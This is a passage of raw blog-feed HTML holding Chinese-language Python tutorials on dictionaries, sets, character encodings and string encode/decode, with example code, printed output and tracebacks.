class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS"><strong>二、删除键—值对</strong></font></p><p>能删单一的元素也能清空字典，清空只需一项操作。</p><blockquote><p><font color="#FF7F00"><strong>删除字典可以使用del或者pop()。</strong></font></p><ol><li><font color="#FF7F00"><strong>要删除一个key:</strong></font><ol><li>用pop(key)方法，对应的value也会从dict中删除</li><li>可使用del 语句将相应的键—值对彻底删除。使用del 语句时，必须指定字典名和要删除的键。<code>del dict[&#39;key&#39;]</code></li></ol></li><li><font color="#FF7F00"><strong>删除整个字典：</strong></font>del dict 则dict这个字典被删除了</li></ol></blockquote><br><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span>dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Zara'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'Class'</span><span class="token punctuation">:</span> <span class="token string">'First'</span><span class="token punctuation">}</span><span class="token keyword">del</span> dict<span class="token punctuation">[</span><span class="token string">'Name'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># 删除键是'Name'的条目</span>dict<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'Class'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict<span class="token punctuation">[</span><span class="token string">'Age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>dict<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 清空词典所有条目</span><span class="token keyword">del</span> dict          <span class="token comment" spellcheck="true"># 删除词典</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict<span class="token punctuation">[</span><span class="token string">'Age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>运行结果：<span class="token number">7</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"1.py"</span><span class="token punctuation">,</span> line <span class="token number">11</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dict<span class="token punctuation">[</span><span class="token string">'Age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>TypeError<span class="token punctuation">:</span> <span class="token string">'type'</span> object <span class="token keyword">is</span> <span class="token operator">not</span> subscriptable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="6-3-字典的遍历"><font color="#3CB371" face="Comic sans MS">6.3 字典的遍历</font><a href="post/Python-list-tuple-dict-set#6-3-字典的遍历"></a></h4><p><font color="#00B2EE" face="Comic sans MS"><strong>一、判断字典中</strong><font color="red"><strong>某个键</strong></font><strong>是否存在</strong></font></p><blockquote><p><font color="#FF7F00"><strong>方法：</strong></font></p><ol><li>通过in判断key是否存在；</li><li>通过dict提供的get()方法，如果key不存在，可以返回None，或者返回自己指定的value。</li></ol></blockquote><br><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span>dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Zara'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'Class'</span><span class="token punctuation">:</span> <span class="token string">'First'</span><span class="token punctuation">}</span>a <span class="token operator">=</span> <span class="token string">'Name'</span> <span class="token keyword">in</span> dictb <span class="token operator">=</span> <span class="token string">'Year'</span> <span class="token keyword">in</span> dict<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>c <span class="token operator">=</span> dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Name'</span><span class="token punctuation">,</span><span class="token string">'如果不存在，这里是返回信息'</span><span class="token punctuation">)</span>d <span class="token operator">=</span> dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Year'</span><span class="token punctuation">,</span><span class="token string">'如果不存在，这里是返回信息'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>运行结果：<span class="token boolean">True</span><span class="token boolean">False</span>Zara如果不存在，这里是返回信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS"><strong>二、遍历字典中的所有键</strong></font></p><p>在不需要使用字典中的值时，方法keys() 很有用。</p><pre class="line-numbers language-python"><code class="language-python">f <span class="token operator">=</span> <span class="token punctuation">{</span>      <span class="token string">'jen'</span><span class="token punctuation">:</span> <span class="token string">'python'</span><span class="token punctuation">,</span>      <span class="token string">'sarah'</span><span class="token punctuation">:</span> <span class="token string">'c'</span><span class="token punctuation">,</span>      <span class="token string">'edward'</span><span class="token punctuation">:</span> <span class="token string">'ruby'</span><span class="token punctuation">,</span>      <span class="token string">'phil'</span><span class="token punctuation">:</span> <span class="token string">'python'</span><span class="token punctuation">,</span>      <span class="token punctuation">}</span>  <span class="token keyword">for</span> name <span class="token keyword">in</span> f<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：JenSarahEdwardPhil<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS"><strong>三、遍历字典中的所有值</strong></font></p><p>如果你感兴趣的主要是字典包含的值，可使用方法values() ，它返回一个值列表，而不包含任何键。</p><pre class="line-numbers language-python"><code class="language-python">f <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'jen'</span><span class="token punctuation">:</span> <span class="token string">'python'</span><span class="token punctuation">,</span>    <span class="token string">'sarah'</span><span class="token punctuation">:</span> <span class="token string">'c'</span><span class="token punctuation">,</span>    <span class="token string">'edward'</span><span class="token punctuation">:</span> <span class="token string">'ruby'</span><span class="token punctuation">,</span>    <span class="token string">'phil'</span><span class="token punctuation">:</span> <span class="token string">'python'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token keyword">for</span> g <span class="token keyword">in</span> f<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：PythonCRubyPython<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="6-4-字典的各种嵌套"><font color="#3CB371" face="Comic sans MS">6.4 字典的各种嵌套</font><a href="post/Python-list-tuple-dict-set#6-4-字典的各种嵌套"></a></h4><p>请自行查阅Python编程：从入门到实践 6.4</p><br><h4 id="6-5-字典内置函数-amp-方法"><font color="#3CB371" face="Comic sans MS">6.5 字典内置函数&amp;方法</font><a href="post/Python-list-tuple-dict-set#6-5-字典内置函数-amp-方法"></a></h4><p>可查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-dictionary.html" target="_blank" rel="noopener">Python字典函数&amp;方法</a>]</font></p><br><p><font color="#00B2EE" face="Comic sans MS"><strong>一、Python字典包含了以下内置函数：</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">序号</th><th align="left">函数</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">cmp(dict1, dict2)<br>比较两个字典元素。</td></tr><tr><td align="center">2</td><td align="left">len(dict)<br>计算字典元素个数，即键的总数。</td></tr><tr><td align="center">3</td><td align="left">str(dict)<br>输出字典可打印的字符串表示。</td></tr><tr><td align="center">4</td><td align="left">type(variable)<br>返回输入的变量类型，如果变量是字典就返回字典类型。</td></tr></tbody></table></div></div><br><p><font color="#00B2EE" face="Comic sans MS"><strong>二、Python字典包含了以下内置方法：</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">序号</th><th align="left">方法</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">dict.clear()<br>删除字典内所有元素</td></tr><tr><td align="center">2</td><td align="left">dict.copy()<br>返回一个字典的浅复制</td></tr><tr><td align="center">3</td><td align="left">dict.fromkeys(seq[, val])<br>创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值</td></tr><tr><td align="center">4</td><td align="left">dict.get(key, default=None)<br>返回指定键的值，如果值不在字典中返回default值</td></tr><tr><td align="center">5</td><td align="left">dict.has_key(key)<br>如果键在字典dict里返回true，否则返回false</td></tr><tr><td align="center">6</td><td align="left">dict.items()<br>以列表返回可遍历的(键, 值) 元组数组</td></tr><tr><td align="center">7</td><td align="left">dict.keys()<br>以列表返回一个字典所有的键</td></tr><tr><td align="center">8</td><td align="left">dict.setdefault(key, default=None)<br>和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td></tr><tr><td align="center">9</td><td align="left">dict.update(dict2)<br>把字典dict2的键/值对更新到dict里</td></tr><tr><td align="center">10</td><td align="left">dict.values()<br>以列表返回字典中的所有值</td></tr><tr><td align="center">11</td><td align="left">pop(key[,default])<br>删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td></tr><tr><td align="center">12</td><td align="left">popitem()<br>随机返回并删除字典中的一对键和值。</td></tr></tbody></table></div></div><br><br><h3 id="七-集合"><font color="#FF6347" face="Comic sans MS">七. 集合</font><a href="post/Python-list-tuple-dict-set#七-集合"></a></h3><blockquote><p><font color="#FF7F00"><strong>集合是什么：</strong></font></p><ol><li>集合和字典类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在集合中，没有重复的key；</li><li>集合可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集，差等操作；</li><li>基本功能包括关系测试和消除重复元素。集合对象还支持 union（联合），intersection（交），difference（差）和 sysmmetric difference（对称差集）等数学运算；</li><li>大括号或 set() <strong>函数</strong>可以用来创建集合。注意：想要创建空集合，你必须使用 set() 而不是 {}。后者用于创建空字典。</li><li>注意：<font color="#FF7F00"><strong>set()只能放一个参数，它会将里面的字符串拆成字符，并且每个字符都是无序的（集合的属性）</strong></font>；</li><li>如果集合中包含多喝不可拆的元素，则必须用{}来定义集合。</li></ol></blockquote><br><p>仔细分析如下代码：</p><pre class="line-numbers language-python"><code class="language-python">basket <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'apple'</span><span class="token punctuation">,</span>     <span class="token string">'orange'</span><span class="token punctuation">,</span>     <span class="token string">'apple'</span><span class="token punctuation">,</span>     <span class="token string">'pear'</span><span class="token punctuation">,</span>     <span class="token string">'orange'</span><span class="token punctuation">,</span>     <span class="token string">'banana'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>basket<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> a <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token string">'abracadabra'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token string">'alacazam'</span><span class="token punctuation">)</span>c <span class="token operator">=</span>set<span class="token punctuation">(</span><span class="token string">'我们'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">|</span> b<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b <span class="token punctuation">)</span> 运行结果：<span class="token punctuation">{</span><span class="token string">'pear'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">,</span> <span class="token string">'apple'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'们'</span><span class="token punctuation">,</span> <span class="token string">'我'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-字符编码&amp;字符串&amp;格式化</title>
      <link href="/post/Python-Coding/"/>
      <url>/post/Python-Coding/</url>
      
        <content type="html"><![CDATA[<p>字符编码、字符串(๑°⌓︎°๑) </p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">Python-字符编码、字符串、格式化</font> </center><br><br><h3 id="一-字符编码"><font color="#FF6347" face="Comic sans MS">一. 字符编码</font><a href="post/Python-Coding#一-字符编码"></a></h3><ol><li><p>我们已经讲过了，字符串也是一种数据类型，但是，<strong>字符串</strong>比较特殊的是还有一个<strong>编码</strong>问题。</p></li><li><p><font color="#FF7F00"><strong>因为计算机只能处理数字，如果要处理文本，就必须先把文本转换为数字才能处理</strong></font>。最早的计算机在设计时采用8个比特（<strong><code>8 bit</code></strong>）作为一个字节（<strong><code>1 byte</code></strong>）。</p><ol><li>所以，<strong><code>一个字节</code></strong>能表示的最大的整数就是<strong><code>255</code></strong>（二进制11111111=十进制255）；</li><li>如果要表示更大的整数，就必须用更多的字节。比如两个字节可以表示的最大整数是65535，<strong><code>4个字节</code></strong>可以表示的最大整数是<strong><code>4294967295</code></strong>。</li></ol></li><li><p>由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为<font color="#FF7F00"><strong>ASCII编码</strong></font>，比如大写字母<code>A</code>的编码是<code>65</code>，小写字母<code>z</code>的编码是<code>122</code>。</p></li><li><p>但是要处理中文显然一个字节是不够的，<strong>至少需要两个字节</strong>，而且还不能和ASCII编码冲突，所以，<font color="#FF7F00"><strong>中国制定了GB2312编码，用来把中文编进去</strong></font>。</p></li><li><p>你可以想得到的是，全世界有上百种语言，日本把日文编到<code>Shift_JIS</code>里，韩国把韩文编到<code>Euc-kr</code>里，各国有各国的标准，就会不可避免地出现冲突，结果就是，在多语言混合的文本中，显示出来会有乱码。</p></li><li><p>因此，<code>Unicode</code>应运而生。<font color="#FF7F00"><strong>Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了</strong></font>。</p><ol><li><p>Unicode标准也在不断发展，但最常用的是<font color="#00B2EE"><strong>用两个字节表示一个字符</strong></font>（如果要用到非常偏僻的字符，就需要4个字节）。现代操作系统和大多数编程语言都直接支持Unicode。</p></li><li><p>现在，捋一捋ASCII编码和Unicode编码的区别：<font color="#00B2EE"><strong>ASCII编码是1个字节，而Unicode编码通常是2个字节</strong></font>。</p><ol><li>字母<code>A</code>用ASCII编码是十进制的<code>65</code>，二进制的<code>01000001</code>；</li><li>字符<code>0</code>用ASCII编码是十进制的<code>48</code>，二进制的<code>00110000</code>，注意字符’0’(‘零’)和整数0(零)是不同的；</li><li>汉字<code>中</code>已经超出了ASCII编码的范围，用Unicode编码是十进制的<code>20013</code>，二进制的<code>01001110 00101101</code>。</li><li>你可以猜测，如果<font color="red"><strong>把ASCII编码的A用Unicode编码，只需要在前面补0(零)就可以</strong></font>，因此，A的Unicode编码是00000000 01000001。</li></ol></li><li><p>新的问题又出现了：如果统一成Unicode编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，<font color="#00B2EE"><strong>用Unicode编码比ASCII编码需要多一倍的存储空间</strong></font>，在存储和传输上就十分不划算。</p></li><li><p>所以，<strong>本着节约的精神</strong>，又出现了<font color="#00B2EE"><strong>把Unicode编码转化为“可变长编码”的UTF-8编码</strong></font>。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间：</p></li></ol></li></ol><p>||||<br>:-:|:-:|:-:|:-:|<br>字符    |ASCII    |Unicode    |UTF-8<br>A    |1000001    |00000000 01000001    |01000001<br>中    |x            |01001110 00101101    |11100100 10111000 10101101</p><blockquote><ol><li>从上面的表格还可以发现，UTF-8编码有一个额外的好处，就是<font color="#FF7F00"><strong>ASCII编码实际上可以被看成是UTF-8编码的一部分</strong></font>，所以，大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作。</li></ol></blockquote><p><strong>总结一下现在计算机系统通用的字符编码工作方式：</strong></p><ol><li><font color="#FF7F00"><strong>在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码</strong></font>。</li><li>举例：用记事本编辑(计算机内存中)的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8(保存到文件硬盘或者需要传输)</li></ol><br><p>PS：所以你看到很多网页的源码上会有类似<code>&lt;meta charset=&quot;UTF-8&quot; /&gt;</code>的信息，表示该网页正是用的UTF-8编码。</p><br><br><h3 id="二-代码编码和文件编码的设置"><font color="#FF6347" face="Comic sans MS">二. 代码编码和文件编码的设置</font><a href="post/Python-Coding#二-代码编码和文件编码的设置"></a></h3><blockquote><p><strong>Python中默认的编码格式是 ASCII 格式，在没修改编码格式时无法正确打印汉字，所以在读取中文时会报错。</strong><br>解决方法为只要在文件开头加入<code># -*- coding: UTF-8 -*-</code> 或者 <code>#coding=utf-8</code> 就行了<br>（<strong>注意：</strong><code>#coding=utf-8</code> 的 <code>=</code> 号两边不要空格。）</p></blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token keyword">print</span> <span class="token string">"你好，世界"</span><span class="token punctuation">;</span>运行结果：你好，世界<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注意：</strong></p><ol><li>Python3.X 源码文件默认使用utf-8编码，所以可以正常解析中文，无需指定 UTF-8 编码。</li><li>注意：如果你使用编辑器，同时需要设置 py 文件存储的格式为 UTF-8</li></ol></blockquote><br><br><h3 id="三-字符与编码的转换"><font color="#FF6347" face="Comic sans MS">三. 字符与编码的转换</font><a href="post/Python-Coding#三-字符与编码的转换"></a></h3><p>在最新的Python 3版本中，<font color="#FF7F00"><strong>字符串是以Unicode编码的</strong></font>，也就是说，Python的字符串支持多语言（字符串可以写任意国家文字）。</p><br><h4 id="3-1-字符与十进制编码的转换"><font color="#3CB371" face="Comic sans MS">3.1 字符与十进制编码的转换</font><a href="post/Python-Coding#3-1-字符与十进制编码的转换"></a></h4><blockquote><p><strong>使用函数：</strong></p><ol><li>ord()：将字符转换成其对应的整数（十进制），注意不是字符串；</li><li>chr()：将十进制整数转换成其对应的字符。</li></ol></blockquote><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span>ord<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span>b<span class="token operator">=</span>chr<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>运行结果：<span class="token number">65</span> x <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="3-2-不同编码之间的转换"><font color="#3CB371" face="Comic sans MS">3.2 不同编码之间的转换</font><a href="post/Python-Coding#3-2-不同编码之间的转换"></a></h4><p>由于Python的字符串类型是str，<font color="#FF7F00"><strong>在内存中以Unicode表示，一个字符对应若干个字节</strong></font>。如果要在网络上传输，或者保存到磁盘上，就需要<font color="#FF7F00"><strong>把str变为以字节为单位的bytes</strong></font>。</p><p>Python对bytes类型的数据用带<code>b前缀</code>的<font color="#FF7F00"><strong>单引号</strong></font>或<font color="#FF7F00"><strong>双引号</strong></font>表示：</p><pre class="line-numbers language-python"><code class="language-python">x <span class="token operator">=</span> b<span class="token string">'ABC'</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>运行结果：b<span class="token string">'ABC'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>结论：</strong>要注意区分’ABC’和b’ABC’，前者是str，后者虽然内容显示得和前者一样，但<font color="#FF7F00"><strong>bytes的每个字符都只占用一个字节</strong></font>。</p></blockquote><br><p><font color="#00B2EE" face="Comic sans MS"><strong>不同编码之间的转换使用函数：</strong></font></p><ol><li><strong>decode()：</strong> 解码，将其他编码的字符串解码成unicode编码；</li><li><strong>encode()：</strong> 转码，将unicode编码的字符串转码成其他编码。</li><li><strong>decode(“utf-8”, errors=”ignore”) ：</strong> 忽略其中有异常的编码，仅显示有效的编码；</li><li><strong>decode(“utf-8”, errors=”replace”)：</strong> 替换其中异常的编码，这个相对来可能一眼就知道那些字符编码出问题了；</li><li><strong>len()：</strong> 计算的是str的字符数，如果换成bytes，len()函数就计算字节数。</li></ol><br><p>资料查阅：<font color="#00B2EE">[<a href="https://blog.csdn.net/xw_classmate/article/details/51934723" target="_blank" rel="noopener">Python中的编码（encode）与解码（decode）程</a>]</font></p><br><p>字符串在Python内部的表示是unicode编码，因此，在做编码转换时，通常需要以unicode作为<font color="#FF7F00"><strong>中间编码</strong></font>，即先将其他编码的字符串解码（<code>decode</code>）成unicode，再从unicode编码（<code>encode</code>）成另一种编码。</p><br><p>举例1：以Unicode表示的str通过<code>encode()</code>方法可以编码为指定的bytes</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ABC'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'中文'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'中文'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：b<span class="token string">'ABC'</span> b<span class="token string">'\xe4\xb8\xad\xe6\x96\x87'</span> Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>   File <span class="token string">"C:\Users\Alvin\AppData\Local\Temp\learn_python_q5t__kzk_py\test_21.py"</span><span class="token punctuation">,</span> line <span class="token number">4</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'中文'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> UnicodeEncodeError<span class="token punctuation">:</span> <span class="token string">'ascii'</span> codec can't encode characters <span class="token keyword">in</span> position <span class="token number">0</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span> ordinal <span class="token operator">not</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p>第三个输出报错是因为含有中文的str无法用ASCII编码，因为中文编码的范围超过了ASCII编码的范围，Python会报错。</p></blockquote><br><p>举例2：以Unicode表示的str通过<code>encode()</code>方法可以编码为指定的bytes    </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token string">'ABC'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token string">'\xe4\xb8\xad\xe6\x96\x87'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token string">'\xe4\xb8\xad\xff'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：ABC 中文 Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>   File <span class="token string">"C:\Users\Alvin\AppData\Local\Temp\learn_python_q5t__kzk_py\test_22.py"</span><span class="token punctuation">,</span> line <span class="token number">4</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>     <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token string">'\xe4\xb8\xad\xff'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> UnicodeDecodeError<span class="token punctuation">:</span> <span class="token string">'utf-8'</span> codec can't decode byte <span class="token number">0xff</span> <span class="token keyword">in</span> position <span class="token number">3</span><span class="token punctuation">:</span> invalid start byte <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>第三个输出报错是因为bytes中包含无法解码的字节，decode()方法会报错。</p></blockquote><br><p>举例3：如果bytes中只有一小部分无效的字节，可以传入<code>errors=&#39;ignore&#39;</code>忽略错误的字节</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token string">'\xe4\xb8\xad'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'中'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token string">'\xe4\xb8\xad\xff'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token 